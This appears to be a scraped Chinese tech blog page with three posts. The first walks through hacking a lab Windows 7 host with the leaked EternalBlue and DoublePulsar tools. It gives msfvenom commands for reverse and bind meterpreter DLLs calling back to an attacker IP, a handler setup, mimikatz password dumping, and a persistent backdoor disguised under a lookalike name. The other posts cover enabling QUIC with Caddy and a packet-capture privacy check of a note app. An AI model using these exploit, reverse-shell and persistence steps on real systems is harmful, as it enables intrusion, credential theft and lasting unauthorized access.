<h3 id="攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152"><a href="#攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152" class="headerlink" title="攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152"></a>攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152</h3><p>任何一个Linux发行版都可以，只要能够运行metasploit即可；如果实在不会用Linux，在Windows下使用metasploit也算可以吧。</p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/products/metasploit/download/">metasploit地址戳我</a></p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>正常来说，咱在做坏事之前，必然要先做一些搜集信息的工作，最常用的工具就是nmap啦！</p>
<p>咱使用nmap 来探测目标的信息，发现445简直就是福利。使用参数-O代表探测操作系统，-A代表all。</p>
<p><img src="/images/042217_1027_ShadowBroke1.png"></p>
<p>Target is all set, blow it! :wink: </p>
<h2 id="配置FuzzBunch"><a href="#配置FuzzBunch" class="headerlink" title="配置FuzzBunch"></a>配置FuzzBunch</h2><p>FuzzBunch需要Python2.6、旧版本的PyWin32</p>
<p>Python2.6：<a target="_blank" rel="noopener" href="https://www.python.org/download/releases/2.6/">https://www.python.org/download/releases/2.6/</a>（记得加到环境变量里）</p>
<p>PyWin32 v2.12：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/</a></p>
<p>当然还有这套工具了：<a target="_blank" rel="noopener" href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a></p>
<p>咱把这些东西都准备妥当了，然后编辑<code>windows/fb.py</code>，注释72行</p>
<p>大概就是如图所示：</p>
<p><img src="/images/042217_1027_ShadowBroke2.png"></p>
<p>之后再改FuzzBunch.xml，19和24行改成和你XP上一样的正确的路径。<img src="/images/042217_1027_ShadowBroke3.png"></p>
<p>之后我们切到对应的目录中，然后执行<code>python fb.py</code>，当当当！</p>
<p><img src="/images/042217_1027_ShadowBroke4.png"></p>
<p>默认的目标IP，就写我们的Windows 7咯，也就是172.26.99.211，下一个callback IP，就是XP的IP，然后Redirection输入no；</p>
<p><img src="/images/042217_1027_ShadowBroke5.png"></p>
<p>下一步，fz让我们给起个名字，由于我已经运行过了，所以就选择create a new project啦</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/042217_1027_ShadowBroke6.png"><img src="/images/042217_1027_ShadowBroke6.png"></a></p>
<h2 id="使用EternalBlue攻击目标"><a href="#使用EternalBlue攻击目标" class="headerlink" title="使用EternalBlue攻击目标"></a>使用EternalBlue攻击目标</h2><p>第一步，咱要用EternalBlue来exploit目标，使用方法类似metasploit</p>
<p>use EternalBlue</p>
<p><img src="/images/042217_1027_ShadowBroke7.png"></p>
<p>啥都不管一直按回车使用默认值，除了在mode的时候选择2：FB</p>
<p><img src="/images/042217_1027_ShadowBroke8.png"></p>
<p>最后EternalBlue会问我们是否执行？直接回车吧。</p>
<p>如果不出意外的话，就应该成功了嗯……</p>
<p><img src="/images/042217_1027_ShadowBroke9.png"></p>
<p>当然要是出意外了，可能就会提示fail，咱要么<code>execute</code>再运行一下，要么就是目标机蓝屏啥了……嗯反正多试试吧。</p>
<h2 id="制作恶意dll"><a href="#制作恶意dll" class="headerlink" title="制作恶意dll"></a>制作恶意dll</h2><p>NSA的这堆exploit是很强大，但是payload感觉好像就弱了一些，像Doublepulsar能够注入dll、shellcode，好像没有metasploit那么强大哎？</p>
<p>没关系，咱用metasploit生成一个dll，交给Doublepulsar注入就好了。</p>
<p>在生成dll之前，咱首先要学习下metasploit中的meterpreter的几种类型：</p>
<p>meterpreter就是一个跨平台的shell，功能很强大，嘿嘿嘿。通常来说meterpreter有这么两种模式：正向和反向</p>
<p><strong>bind</strong>：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下</p>
<p><strong>reverse</strong>：目标机连接攻击者的模式，基本上不会被防火墙阻拦。估计岁数大的小盆友们可能知道灰鸽子？这玩意就是反弹到攻击者的啦。</p>
<p>当然，这俩还能够细分为tcp、http、https，区别是啥，自己看帮助去！</p>
<p>这里咱就创建一个reverse_tcp啦。</p>
<p>需要注意的是，Doublepulsar要求比较多，64位的系统必须用64位的dll，32位的当然只能用32位的了，所以别搞错了。</p>
<p>咱直接打开终端，输入如下命令：</p>
<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.26.96.152 LPORT&#x3D;8089 -f dll &gt;reverse.dll</p>
<p>其中LHOST代表kali的IP地址，LPORT代表本地监听的地址（因为要反弹嘛），生成的文件名字为reverse.dll</p>
<p>我们只要简单的把这个dll拷贝到xp中即可。哎，咋拷贝最方便呢？没装虚拟机的辅助工具？没关系，在dll的存放目录下来一句<code>python –m SimpleHTTPServer 80</code></p>
<p>拿起XP里久违的IE6，访问kali的IP然后下载那个dll就好了嘛。</p>
<p>然后咱就让metasploit开启监听吧！</p>
<p>set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>use exploit&#x2F;multi&#x2F;handler<br>set lhost 172.26.96.152<br>set LPORT 8089<br>run</p>
<p><img src="/images/042217_1027_ShadowBroke10.png"></p>
<p>附录： 生成bind模式的meterpreter</p>
<p>#32位<br>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x86bind.dll<br>#64位<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x64bind.dll</p>
<p>RHOST为目标机的IP、LPORT为目标机开的端口号</p>
<h2 id="使用Doublepulsar注入我们的恶意dll"><a href="#使用Doublepulsar注入我们的恶意dll" class="headerlink" title="使用Doublepulsar注入我们的恶意dll"></a>使用Doublepulsar注入我们的恶意dll</h2><p>use DoublePulsa</p>
<p>老样子，一路回车，除了Architecture选择x64，Function选RunDLL，然后输入DLL路径。</p>
<p><img src="/images/042217_1027_ShadowBroke11.png"></p>
<p>如果运气好的话，嘿嘿嘿……</p>
<p><img src="/images/042217_1027_ShadowBroke12.png"></p>
<h2 id="之后该做什么呢"><a href="#之后该做什么呢" class="headerlink" title="之后该做什么呢"></a>之后该做什么呢</h2><h3 id="获取管理员密码"><a href="#获取管理员密码" class="headerlink" title="获取管理员密码"></a>获取管理员密码</h3><p>当然第一步是吧管理员密码搞出来了，怎么办呢？很简单啦其实</p>
<p>load mimikatz<br>wdigest</p>
<p><img src="/images/042217_1027_ShadowBroke13.png"></p>
<p>哎这兄弟有我这样的室友真是悲剧啊……</p>
<h3 id="植入持久后门"><a href="#植入持久后门" class="headerlink" title="植入持久后门"></a>植入持久后门</h3><p>万一目标重启了，咱就要重新exploit、植入dll（因为这玩意是跑在内存里的），多不方便，所以不如咱植入个持久后门嘛，当然，咱要先交叉编译一个后门……</p>
<p>嗯其实就是，自己看着来，大概就是：</p>
<p>msfpc windows 172.26.99.211 443 bind verbose</p>
<p><img src="/images/042217_1027_ShadowBroke14.png"></p>
<p>之后meterpreter里来这么一句</p>
<p>run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe REXENAME&#x3D;cmd.exe REXEPATH&#x3D;&#x2F;root&#x2F;backdoor&#x2F;miao.exe STARTUP&#x3D;USER</p>
<p>其中REXENAME是拷贝到目标系统中的名字，咱取个比较有迷惑性的，比如说exp1orer.exe啦（注意是1不是l），cmd.exe啦，httpd.exe啦等等吧；REXEPATH是后门在本地的位置，STARTUP有USER、SYSTEM、SERVICE这三种取值。看参数就知道是啥意思了。</p>
<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>反正我们是啥都没要，一个IP就成功的黑了进去。颇有当年ms08-067的风范。</p>
<p>可怕的地方就是，看文件的时间戳，NSA在2011年就有了EternalBlue……你再看这文件名Eternal永远的永恒的……</p>
<p>等等……标题里还说了要黑Windows Server 2003不是？可是metasploit里的那个不支持中文版的Windows Server 2003啊……所以，要么咱用修改版的ms08-067，要么用NSA的那个。</p>
<p>修改版的ms-08-067戳我，<a target="_blank" rel="noopener" href="http://bbs.pediy.com/thread-186737.htm">来源戳我</a>，地址与使用方法戳章鱼猫 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ms08-067/_Server/_2003/_Chinese/_Version'/]%E5%BC%80%E6%BA%90%E8%90%8C%E8%90%8C%E5%93%92%E7%AB%A0%E9%B1%BC%E7%8C%AB/[/gt/]">https://github.com/BennyThink/ms08-067\_Server\_2003\_Chinese\_Version&#39;\]开源萌萌哒章鱼猫\[/gt\]</a></p>
<h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>exploit db论文： <a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/41896.pdf">How to Exploit ETERNALBLUE and DOUBLEPULSAR on Windows 7&#x2F;2008</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/22/shadowbroker/index/" data-id="clhp7rtjt008is2qr2l3ycqyu" data-title="[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-quic/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/06/quic/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-06T00:00:00.000Z" itemprop="datePublished">2017-04-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/website/">website</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/06/quic/index/">前卫一下：给你的网站开启QUIC</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>今天在推上偶然发现Google在自己的服务器上启用了<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/QUIC">QUIC</a>，QUIC这东西嘛（发音同quick），就是Quick UDP Internet Connection，Google制定的一种基于UDP的低时延的互联网传输层协议。我觉得吧，Google率先在自家鼓捣部署的东西，那都是比较有前景的，比如说<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SPDY">spdy</a>（基本上成了<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP/2">http&#x2F;2</a>的前身），比如说bbr，反正大概都是一些很牛的东西，我有信心般<strong>盲目的相信</strong>QUIC也是挺有前景的！</p>
<p>通常呐，咱们在访问一些HTTPS网站的时候，Chrome会告诉我们该连接使用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0">TLS</a>1.2（好像Google也在自家的一些服务部署了TLS1.3，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0#TLS_1.3.EF.BC.88.E8.8D.89.E6.A1.88.EF.BC.89">TLS1.3还是草案呢吧</a>），使用XXX加密和身份验证，使用XXX作为密钥交换机制。咱都知道HTTP是基于TCP的应用层协议，而TLS就好似套在了应用层和传输层之间的东西一样。盗用别人的话，以前的HTTP就是塑料管，一捅就漏（被篡改、劫持等），但是TLS就像是个金属外壳，这么一包上啊，就没那么容易漏水了。</p>
<p>而QUIC这玩意就更好玩了，它没管TCP的事，反而奇葩选择了UDP做为下一层协议，并且QUIC协议内置了TLS栈，实现了自己的传输加密层，等等等等我是说不明白了，反正我也不懂装懂呢嘛，盗用网上的图，QUIC的地位看起来是这样的：</p>
<p><img src="/images/040617_1241_QUI1.png"></p>
<p>反正嘛，这玩意就是看起来很厉害的样子，鉴于还没看到类似的中文教程，我就自己折腾下分享出来吧！请注意，这整篇文章都是<strong>实验性质</strong>的，想好了再折腾啊！出事了别怪我就好哦。</p>
<h2 id="对QUIC的支持"><a href="#对QUIC的支持" class="headerlink" title="对QUIC的支持"></a>对QUIC的支持</h2><h3 id="支持QUIC的Web服务器"><a href="#支持QUIC的Web服务器" class="headerlink" title="支持QUIC的Web服务器"></a>支持QUIC的Web服务器</h3><p>目前支持QUIC的服务器不是那么多，在Chromium的源码中有一个测试服务器，GitHub上有几个从Chromium抠下来的项目，还有go quic，大概都是属于<strong>pre-alpha</strong>阶段。但是几经搜寻，我找到了一个名为<a target="_blank" rel="noopener" href="https://caddyserver.com/">caddy</a>的、用go写的Web服务器，这家伙提供<strong>实验性质的quic支持</strong>。</p>
<p>话说这caddy有啥新特性呢？我去官网看了眼文档，给我的感觉是，caddy的目的是让网站变得<strong>更简单更易用</strong>，抢Nginx和Apache的饭碗并不是它的追求。而且这家伙配置文件很简洁，也没啥依赖，大概随用随走的意思！当然可能它也是为数不多的、开源的支持quic的Web服务器吧！</p>
<p>最令人眼睛一亮的是，这家伙自己就支持https，能签证书、续期咱就输个邮箱啥的，它就能帮咱去Let’s Encrypt搞个证书回来，而且去SSLLabs还会得A，简直是神奇啊！而且这家伙还能直接从git push写博客，具体没仔细看</p>
<p>[v_blue]有小伙伴可能会问了，那Nginx、Apache这俩是否支持QUIC呢？这个嘛……短时间之内应该还不会支持。毕竟这改动要好大的。GitHub上有个libquic，目前只有实验性质的<a target="_blank" rel="noopener" href="https://github.com/devsisters/goquic">goquic</a>能用这个库，别的还是等等吧。等到支持的时候，重新编译下就好啦。[&#x2F;v_blue]</p>
<h3 id="支持QUIC的浏览器"><a href="#支持QUIC的浏览器" class="headerlink" title="支持QUIC的浏览器"></a>支持QUIC的浏览器</h3><p>呐……Chrome、Chromium都没问题的！只要你的版本比较新，基本上就已经支持并默认开启QUIC啦。咱可以到<code>chrome://net-internals/#quic</code>里看下，开头就会告知我们是否启用了QUIC的支持。如果没开启的话，就到<code>chrome://flags</code>开启下</p>
<p>这么一看，那就是服务端的支持了，那咱咋开启啊……当然是去caddy官网下载，然后启动就好了。话说想要成功有挺多条件的，有一片不深不浅的水域，有一块不大不小的坑……啊不对，反正就是不是想象中的那么简单啦。</p>
<p>咱来谈谈准备条件吧。</p>
<p>首先，咱得有个域名，有个服务器，要是WordPress啥的还得准备好PHP、MySQL（MariaDB）啥的，对，最好再把证书也搞好（这一步不是必须的，因为Caddy可以为咱申请证书，但是我就当大家都搞好了）。我的运行环境是Ubuntu 16.04 64Bit，别的环境不敢保证。</p>
<p>好，今天有点废话，那咱正式开始踩坑吧……</p>
<p>咦？都有什么坑呀？我会告诉你，caddy官网下载的二进制如果开启quic会报错退出哟；我还会说，需要go1.8，包管理器的go1.6是不行滴！</p>
<p>如果你太懒，懒得自己弄，并且相信我的话，那就<a target="_blank" rel="noopener" href="http://oks2t4o68.bkt.clouddn.com/caddy20170417.tar.bz2">戳我</a>下载我编译好的吧！</p>
<h2 id="安装golang"><a href="#安装golang" class="headerlink" title="安装golang"></a>安装golang</h2><p>这golang啊，是C语言他爹、玩了<a target="_blank" rel="noopener" href="https://dmesg.app/reason-of-this-blog.html">Thompson Hack</a>的汤普森老爷子在Google搞的语言，据说很牛。怎奈Ubuntu 16.04的源里的go是1.6，然而caddy需要1.8，所以咱只能自己从官网搞个go回来了。为了偷懒，我们就不从源码编译了，直接下二进制就好了。想从源码编译golang的我不拦着哟！</p>
<p>wget <a target="_blank" rel="noopener" href="https://storage.googleapis.com/golang/go1.8.linux-amd64.tar.gz">https://storage.googleapis.com/golang/go1.8.linux-amd64.tar.gz</a><br>sudo tar -C &#x2F;usr&#x2F;local -xzf go1.8.linux-amd64.tar.gz<br>#编辑bashrc<br>vim ~&#x2F;.bashrc<br>#文件最后加入这么一行，保存退出<br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin<br>#重新载入<br>source ~&#x2F;.bashrc<br>go version</p>
<p>显示为go version go1.8 linux&#x2F;amd64就可以了</p>
<p>注意：如果你安装了1.8以下的golang，需要卸载，包管理器的就用类似<code>apt remove golang-go</code>之类的命令卸载，编译的就直接<code>sudo rm –rf /usr/local/go</code>即可</p>
<h2 id="准备并编译caddy"><a href="#准备并编译caddy" class="headerlink" title="准备并编译caddy"></a>准备并编译caddy</h2><p>啥gcc啊，make啊，源码啊啥的都得准备好，gcc之类的就不说了，包管理器就够了。咱从源码开始，我们就假设工作目录为<code>/home/test</code>了、并且你已经切换到这个目录啦。</p>
<p>export GOPATH&#x3D;&#x2F;home&#x2F;test<br>go get github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>.&#x2F;build.bash</p>
<p>我估计大家会在第二步的时候失败或者是太慢（尤其是当你的服务器在境内的时候），那么请跟我一起艹GFW吧；</p>
<p>可以考虑使用下面这一堆命令</p>
<p>export GOPATH&#x3D;&#x2F;home&#x2F;test<br>wget <a target="_blank" rel="noopener" href="http://7xvwrt.com1.z0.glb.clouddn.com/caddy170406.tar.bz2">http://7xvwrt.com1.z0.glb.clouddn.com/caddy170406.tar.bz2</a><br>tar xf caddy170406.tar.bz2<br>cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>.&#x2F;build.bash</p>
<p>在执行完最后一句的时候，咱应该会在当前目录下发现一个名为<code>caddy</code>的二进制程序。当然如果咱就想要个性，咱用<code>./build.bash fuckGFW</code>那生成的二进制就叫<code>fuckGFW</code>了。那些<code>./build.bash candy.exe</code>的人还是让我去撞墙吧\(^o^)&#x2F;~</p>
<h2 id="配置CaddyFile"><a href="#配置CaddyFile" class="headerlink" title="配置CaddyFile"></a>配置CaddyFile</h2><p>假设咱把caddy放在了<code>/home/caddy</code>，反正放哪都行，随便啦。</p>
<p>咱就大概编辑个这么模样的文件，名为Caddyfile</p>
<p>:443 <a target="_blank" rel="noopener" href="http://www.shemissed.me/">www.shemissed.me</a> {<br>root &#x2F;home&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/">www.shemissed.me</a><br>fastcgi &#x2F; &#x2F;tmp&#x2F;php-cgi.sock php<br>log &#x2F;home&#x2F;wwwlogs&#x2F;caddy.<a target="_blank" rel="noopener" href="http://www.shemissed.me.log/">www.shemissed.me.log</a><br>tls &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/fullchain.pem">www.shemissed.me/fullchain.pem</a> &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/privkey.pem">www.shemissed.me/privkey.pem</a><br>}</p>
<p>假如要是有多个虚拟主机（vhost），就接着写</p>
<p>memory.shemissed.me {<br>root &#x2F;home&#x2F;wwwroot&#x2F;memory.shemissed.me<br>fastcgi &#x2F; &#x2F;tmp&#x2F;php-cgi.sock php<br>log &#x2F;home&#x2F;wwwlogs&#x2F;caddy.memory.shemissed.me.log<br>tls &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;memory.shemissed.me&#x2F;fullchain.pem &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;memory.shemissed.me&#x2F;privkey.pem<br>}</p>
<p>类似这样的就行了。</p>
<p>大家伙看着改咯。其中：</p>
<p>如果你想开启HSTS，那就加个</p>
<p>Strict-Transport-Security “max-age&#x3D;63072000; includeSubDomains; preload;”</p>
<p>如果想自己设定cipher suite，那就看<a target="_blank" rel="noopener" href="https://caddyserver.com/docs">官网文档</a>去，剩下的更多的特性，什么rewrite就自己发挥吧。 [v_blue]注意： <code>/tmp/php-cgi.sock</code>是php-fpm的监听地址，去<code>php-fpm.conf</code>里看下listen写的是啥就行了，有的人可能会是<code>127.0.0.1:9000</code>。如果你后端使用的是jsp，也这样照猫画虎的改。[&#x2F;v_blue]</p>
<h2 id="运行caddy"><a href="#运行caddy" class="headerlink" title="运行caddy"></a>运行caddy</h2><p>咱把上上一部编译出来的二进制拷贝到<code>/home/caddy</code>下，然后把这个路径加入到Path之中（<code>export PATH=$PATH:/home/caddy</code>），之后咱<code>caddy -conf /home/caddy/Caddyfile -port 443 -http2 –quic</code>，再去浏览器刷新几下看F12，就应该能看到QUIC了吧？</p>
<p><img src="/images/040617_1241_QUI2.png"></p>
<p>有的时候死活不出来QUIC（尤其是PC版哦），俺也不知道是为啥……PS，此网站不适合访问……！</p>
<h2 id="等等，这就结束了吗？"><a href="#等等，这就结束了吗？" class="headerlink" title="等等，这就结束了吗？"></a>等等，这就结束了吗？</h2><p>当然不是，其实这坑还是非常多的，假如终端关掉了，那caddy不就被kill了嘛。咱可以加个&amp;给丢后台，再用pidof写个脚本加入crontab检查运行状态。尽管如此，这样用也不是最佳实践。</p>
<p>那正确的应该咋用呢？</p>
<p>把二进制放在<code>/usr/local/bin/caddy</code></p>
<p>把SysV风格的启动脚本放在<code>/etc/init.d/caddy</code>（这个脚本可以在官网的二进制包里找到）</p>
<p>配置文件目录放这<code>/etc/caddy</code>证书放在子目录ssl 并且属主是www啥的</p>
<p>创建配置文件<code>/etc/caddy/Caddyfile</code></p>
<p>用<code>service caddy start|stop|restart|reload|status</code> 管理服务（<code>/etc/init.d/candy restart</code>）</p>
<p>还有啥，比如说</p>
<p>别用root运行</p>
<p>用non-login shell运行</p>
<p>提高ulimit文件描述符限制（<code>ulimit -n 8192</code>，或者在<code>/etc/profile</code>中） 反正一堆咯，自己读readme咯</p>
<h2 id="最后的注意事项"><a href="#最后的注意事项" class="headerlink" title="最后的注意事项"></a>最后的注意事项</h2><p>我没把这玩意部署在本站上，因为我目前也暂时把它当做<strong>experimental features &amp; I’m just boring</strong>，所以就搞到了马甲站上，也没做什么更多的测试……等个几年，等到TLS1.3正式公布、QUIC被更多的Web服务器支持，我再开……当然了，现在TCP_BBR已经在4.9内核里，我还是没开 :arrow: </p>
<p>所以，那些想要折腾的、体验一下QUIC快感的人，不妨试试吧！走在世界的最前端~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/06/quic/index/" data-id="clhp7rtif0077s2qrcafz128y" data-title="前卫一下：给你的网站开启QUIC" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-no-more-maxiang/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/05/no-more-maxiang/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-05T00:00:00.000Z" itemprop="datePublished">2017-04-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/05/no-more-maxiang/index/">为了你的隐私考虑，别用马克飞象了</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>评论中某读者和作者求证之后，马克飞象已经不存在这个隐私问题了。请注意。</p>
<p>是的，你没看错，我标题写的是”别用马克飞象”了。似乎我的博客里从来没有出现过说不要用某个产品的说辞，但是这一次，我觉得必须要说一下了。<strong>如果你在意你的隐私，那就别用马克飞象了</strong>。</p>
<p>那么为啥不要用呢？</p>
<h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><p>HTTP传输。<strong>全站HTTPS的行动刻不容缓</strong>，<a target="_blank" rel="noopener" href="https://fiveyellowmice.com/posts/2015/10/fight-a-peoples-war-for-https.html">为 HTTPS 打一场人民战争</a>！</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天白天勤快给<a target="_blank" rel="noopener" href="https://www.tougetu.com/">小蜗牛童鞋</a>的服务器部署了防盗链，用Nginx大概是下面这样的语法：</p>
<p>valid_referers none blocked <a target="_blank" rel="noopener" href="http://www.mingyueli.com/">www.mingyueli.com</a> *.google.com *.baidu.com *.so.com;<br>if ($invalid_referer) {<br>rewrite ^&#x2F; <a target="_blank" rel="noopener" href="https://okwbu9s8e.qnssl.com/moon-hotlink2.png">https://okwbu9s8e.qnssl.com/moon-hotlink2.png</a>;<br>}</p>
<p>大家可以看到，如果referer不是<code>www.mingyueli.com *.google.com *.baidu.com *.so.com</code>这几个，那么就会被302重定向到一个图片上，实际上这个图片也就是盗链提示的图。</p>
<p>晚上的时候，小蜗牛突然给我发图，问我这个防盗链的图是怎么回事。其实我是没想到这么快发现的好吧。想着新站大概也不会有多少流量、有多少盗链，深感此中必有蹊跷，我就分析了下Nginx的日志打算寻找下原因。</p>
<p>首先过滤下302，大概就是这样的命令吧</p>
<p>cat <a href="http://www.mingyueli.com.log|grep">www.mingyueli.com.log|grep</a> –a ‘302’</p>
<p>然后我就发现了这么奇怪的一行日志</p>
<p><img src="/images/040517_1357_1.png"></p>
<p>（出于隐私保护，我把小蜗牛童鞋的IP、UA给打上马赛克了）</p>
<p>果真是有个referer，被Nginx撵走了。但是这个referer这么奇葩，竟然是个IP，是哪的呢？</p>
<p>ip.cn查了下，青岛阿里云，本着好奇的想法就贴到了地址栏，我这么一回车啊……</p>
<p><img src="/images/040517_1357_2.png"></p>
<p>哎我去？我就想，难道这是小蜗牛童鞋自己搭建了一个markdown服务器？不可能啊超级麻烦的，而且闲的没事干啊？</p>
<p>于是我就<code>nslookup</code>一下马克飞象的官网</p>
<p>当当当！</p>
<p><img src="/images/040517_1357_3.png"></p>
<p>然而这丫的官网却是带https的，敢情这IP是<code>default_server</code>啊……</p>
<h2 id="进一步调查"><a href="#进一步调查" class="headerlink" title="进一步调查"></a>进一步调查</h2><p>我开始觉得马克飞象这玩意不太靠谱，于是果断去官网，下个客户端，安装-wireshark抓包。当然啦，俺平时是开着VPN的，如果这个时候抓包，直接被路由表搞走了，肯定是没啥效果的，所以我暂时关了VPN</p>
<p>反正抓包的过程也简单的，既然咱都知道要过滤的目标IP是115.29.201.173，所以咱就选择网卡，抓，打开马克飞象，随意做点操作，上传个图啊什么的。</p>
<p>之后停止抓包，过滤条件里输入这么个条件一回车：</p>
<p>ip.dst&#x3D;&#x3D;115.29.201.173</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040514004141.jpg"><img src="/images/2017040514004141.jpg"></a></p>
<p>好多TCP，有点干扰，为了过滤掉多余的TCP，再这么一弄过滤条件</p>
<p>ip.dst&#x3D;&#x3D;115.29.201.173 and http</p>
<p><img src="/images/2017040514011622.jpg"></p>
<p>我擦别逗我，全都是HTTP的，擦，那我写的东西传输过程中指不定变成啥样、指不定被谁看个遍啊……</p>
<p>太没良心了吧我说！<code>default server</code>（也就是<a target="_blank" rel="noopener" href="http://115.29.201.173/client/_zh.html%EF%BC%89%E5%AD%98%E5%9C%A8%E7%9A%84cookies%E6%B3%84%E9%9C%B2%E3%80%81%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%95%A5%E7%9A%84%E6%88%91%E5%B0%B1%E4%B8%8D%E8%AF%B4%E4%BA%86%EF%BC%8C%E8%BF%99%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9B%B4%E6%8E%A5%E6%98%8E%E6%96%87%E4%BC%A0%EF%BC%8C%E6%98%AF%E5%87%A0%E4%B8%AA%E6%84%8F%E6%80%9D%E5%95%8A%EF%BC%9F%E6%98%8E%E6%96%87%E4%BC%A0%E4%B9%9F%E5%B0%B1%E7%BD%A2%E4%BA%86%EF%BC%8Chost%E8%BF%98%E6%98%AF%60default">http://115.29.201.173/client\_zh.html）存在的cookies泄露、中间人啥的我就不说了，这客户端直接明文传，是几个意思啊？明文传也就罢了，host还是`default</a> server&#96;</p>
<h2 id="HTTPS的通信抓包之后应该是咋样的"><a href="#HTTPS的通信抓包之后应该是咋样的" class="headerlink" title="HTTPS的通信抓包之后应该是咋样的"></a>HTTPS的通信抓包之后应该是咋样的</h2><p>拿本博做例子，是酱紫的：</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040514021066.jpg"><img src="/images/2017040514021066.jpg"></a></p>
<p>咱能明显的看到有Client Hello、密钥交换过程，在这个交换过程中、交换之后，到底做了啥、主机名是啥，咱是真不知道。只有DNS查询过程中能看见我请求了一个解析。这第三者（包括抓包，本质上也算是”窃听者”）想要解密，就没那么容易了。</p>
<p>[v_blue]隐隐约约想起了avast以前会装个自己的根证书，声称是用来解密HTTPS通信、防止一些网页挂马什么的。至于安全性，我是不咋看好。[&#x2F;v_blue]</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后来手欠看了下马克飞象的安装包，图标大概是这样的</p>
<p><img src="/images/040517_1357_4.png"></p>
<p>哎我这不是WinRAR的自解压文件吗？那你要个毛管理员权限啊！在一个<code>test.bat</code>中我发现了这么一句话</p>
<p>为了关联Evernote中的笔记，马克飞象需要向注册表写入配置……</p>
<p>莫非是临时工做的？</p>
